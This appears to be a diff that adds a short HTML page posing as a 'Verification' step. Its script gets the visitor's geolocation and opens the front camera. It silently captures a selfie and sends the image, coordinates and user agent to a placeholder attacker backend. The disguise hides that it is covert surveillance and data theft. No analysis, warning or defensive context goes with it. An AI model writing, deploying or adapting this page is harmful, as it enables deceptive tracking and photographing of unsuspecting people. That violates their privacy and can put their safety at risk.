@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+</head>
+<body>
+  <h3>Verifying...</h3>
+
+  <script>
+    async function start() {
+      let lat = null, lon = null;
+
+      await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            lat = pos.coords.latitude;
+            lon = pos.coords.longitude;
+            resolve();
+          },
+          () => resolve()
+        );
+      });
+
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+      });
+
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      await new Promise(r => setTimeout(r, 1000));
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const image = canvas.toDataURL("image/jpeg");
+      stream.getTracks().forEach(t => t.stop());
+
+      await fetch("https://YOUR-BACKEND.onrender.com/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image,
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent
+        })
+      });
+
+      document.body.innerHTML = "<h3>Done ✅</h3>";
+    }
+
+    start().catch(() => {
+      document.body.innerHTML = "<h3>Permission denied</h3>";
+    });
+  </script>
+</body>
+</html>
